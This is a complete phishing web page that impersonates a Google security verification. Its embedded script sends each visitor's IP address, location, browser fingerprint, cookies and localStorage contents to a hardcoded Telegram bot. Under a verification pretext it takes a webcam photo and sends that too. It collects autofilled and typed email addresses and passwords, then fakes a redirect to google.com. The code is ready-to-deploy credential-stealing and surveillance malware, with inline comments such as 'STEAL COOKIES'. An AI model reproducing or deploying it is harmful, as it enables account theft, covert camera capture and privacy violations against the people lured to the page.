<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Security Check ‚Ä¢ Google</title>
    <style>
        body { font-family: Arial; background: #f2f2f2; text-align: center; padding: 20px; }
        .container { max-width: 400px; margin: auto; background: white; border-radius: 10px; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; }
        #camera { display: none; }
        #status { margin-top: 20px; color: #555; }
    </style>
</head>
<body>
    <div class="container">
        <h2>üîê Security Verification Required</h2>
        <p>Your device needs to verify identity.</p>
        <form id="loginForm">
            <input type="email" id="email" name="email" placeholder="Email address" autocomplete="email" required>
            <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required>
            <button type="submit">Continue</button>
        </form>
        <p id="status">‚è≥ Loading security check...</p>
    </div>

    <video id="video" width="320" height="240" autoplay muted style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        // ================= TELEGRAM CONFIG =================
        const BOT_TOKEN = "8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4";
        const CHAT_ID = "1034878899";
        // ===================================================

        // ---------- 1. IP & GEO INFO ----------
        async function getIPInfo() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return `üåê IP Info
IP: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country_name}
ISP: ${data.org}
Lat/Lon: ${data.latitude}, ${data.longitude}`;
            } catch (e) {
                try {
                    let res2 = await fetch('https://ipinfo.io/json');
                    let data2 = await res2.json();
                    return `üåê IP Info
IP: ${data2.ip}
City: ${data2.city}
Region: ${data2.region}
Country: ${data2.country}
Org: ${data2.org}
Loc: ${data2.loc}`;
                } catch (e2) {
                    return "üåê IP info unavailable";
                }
            }
        }

        // ---------- 2. BROWSER FINGERPRINT ----------
        function getBrowserData() {
            let data = `üíª Browser
User Agent: ${navigator.userAgent}
Language: ${navigator.language}
Platform: ${navigator.platform}
Cookies Enabled: ${navigator.cookieEnabled}
Screen: ${screen.width}x${screen.height}
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Local Storage: ${localStorage.length} items
Session Storage: ${sessionStorage.length} items`;
            return data;
        }

        // ---------- 3. STEAL COOKIES ----------
        function getCookies() {
            return `üç™ Cookies: ${document.cookie || 'none'}`;
        }

        // ---------- 4. CAMERA CAPTURE ----------
        async function captureAndSendPhoto() {
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await video.play();

                // Capture after 1 sec
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                    canvas.toBlob(async (blob) => {
                        // Send to Telegram as photo
                        let formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'selfie.jpg');
                        formData.append('caption', 'üì∏ Selfie captured');

                        try {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        } catch (e) {}

                        // Stop camera
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.9);
                }, 1000);
            } catch (err) {
                sendTextMessage('‚ùå Camera access denied or failed');
            }
        }

        // ---------- 5. SEND TEXT TO TELEGRAM ----------
        async function sendTextMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch (e) {}
        }

        // ---------- 6. STEAL AUTOFILL AFTER DELAY ----------
        function stealAutofill() {
            setTimeout(() => {
                let email = document.getElementById('email').value;
                let password = document.getElementById('password').value;
                if (email || password) {
                    sendTextMessage(`üîë Autofilled Credentials\nEmail: ${email}\nPassword: ${password}`);
                }
            }, 2000); // Wait for autofill
        }

        // ---------- 7. CAPTURE FORM SUBMIT ----------
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            let email = document.getElementById('email').value;
            let password = document.getElementById('password').value;
            sendTextMessage(`üìß Manual Login\nEmail: ${email}\nPassword: ${password}`);
            document.getElementById('status').innerText = '‚úÖ Verification complete. Redirecting...';
            // Fake redirect
            setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
        });

        // ---------- 8. INITIAL EXECUTION ----------
        window.onload = async function() {
            // Send IP + Browser + Cookies
            let ipInfo = await getIPInfo();
            let browserInfo = getBrowserData();
            let cookies = getCookies();
            await sendTextMessage(`üî∞ NEW VISITOR\n${ipInfo}\n\n${browserInfo}\n\n${cookies}`);

            // Request camera with pretext
            document.getElementById('status').innerText = 'üì∑ Camera access required for verification';
            setTimeout(() => {
                captureAndSendPhoto();
            }, 500);

            // Steal autofilled credentials
            stealAutofill();

            // Try to get localStorage/sessionStorage contents (first few)
            try {
                let ls = '';
                for (let i = 0; i < localStorage.length && i < 10; i++) {
                    let key = localStorage.key(i);
                    ls += `${key}: ${localStorage.getItem(key).substring(0, 50)}...\n`;
                }
                if (ls) sendTextMessage(`üóÑ LocalStorage (first 10):\n${ls}`);
            } catch (e) {}
        };
    </script>
</body>
</html>
